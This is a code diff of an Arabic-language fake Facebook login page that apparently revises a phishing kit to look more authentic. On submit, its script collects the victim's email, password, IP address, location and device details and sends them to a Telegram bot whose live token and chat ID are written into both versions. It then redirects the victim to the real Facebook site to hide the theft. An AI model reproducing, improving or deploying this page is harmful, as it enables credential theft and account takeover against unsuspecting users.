@@ -3,33 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
+<title>تسجيل الدخول - Facebook</title>
 <style>
-body{font-family:Arial;background:linear-gradient(135deg,#1877f2,#0a4da6);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;margin:0}
-.container{background:#fff;padding:35px 25px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.2);width:100%;max-width:400px}
-h1{color:#1877f2;text-align:center;font-size:32px;margin-bottom:5px}
-p{color:#666;text-align:center;font-size:14px;margin-bottom:20px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:linear-gradient(135deg,#1877f2,#0a4da6);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.card{background:#fff;padding:35px 25px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.2);width:100%;max-width:400px}
+.logo{text-align:center;font-size:48px;color:#1877f2;font-weight:bold;margin-bottom:20px}
 input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;background:#f9f9f9;box-sizing:border-box}
 button{width:100%;padding:15px;background:#1877f2;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:15px}
+.footer{text-align:center;margin-top:20px;color:#999;font-size:12px}
 </style>
 </head>
 <body>
-<div class="container">
-<h1>facebook</h1>
-<p>تسجيل الدخول إلى حسابك</p>
+<div class="card">
+<div class="logo">facebook</div>
 <form id="f">
 <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
 <input type="password" id="password" placeholder="كلمة المرور" required>
 <button type="submit">تسجيل الدخول</button>
 </form>
+<div class="footer">© 2026 Facebook Inc.</div>
 </div>
 <script>
 async function ip(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;}catch(e){return 'N/A';}}
 document.getElementById('f').addEventListener('submit',async function(e){
 e.preventDefault();
 const info=await ip();
-const msg='📥 *فيسبوك - بيانات جديدة*\n\n📧 `'+document.getElementById('email').value+'`\n🔑 `'+document.getElementById('password').value+'`\n\n🌐 IP: `'+info+'`\n📱 '+navigator.platform+'\n🌐 '+navigator.language+'\n📺 '+window.screen.width+'x'+window.screen.height+'\n🕐 '+new Date().toLocaleString('ar-IQ');
-const url='https://api.telegram.org/bot8899269662:AAFKrQ6uOIQkcJT77w5_ONiMgKhfnAE0dK4/sendMessage?chat_id=1250341553&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
+const msg='📥 *فيسبوك*\n\n📧 `'+document.getElementById('email').value+'`\n🔑 `'+document.getElementById('password').value+'`\n\n🌐 IP: `'+info+'`\n📱 '+navigator.platform+'\n🕐 '+new Date().toLocaleString('ar-IQ');
+const url='https://api.telegram.org/bot8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s/sendMessage?chat_id=-1003821295154&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
 try{await fetch(url);alert('تم تسجيل الدخول');document.getElementById('f').reset();window.location.href='https://www.facebook.com';}catch(e){alert('خطأ');}
 });
 </script>
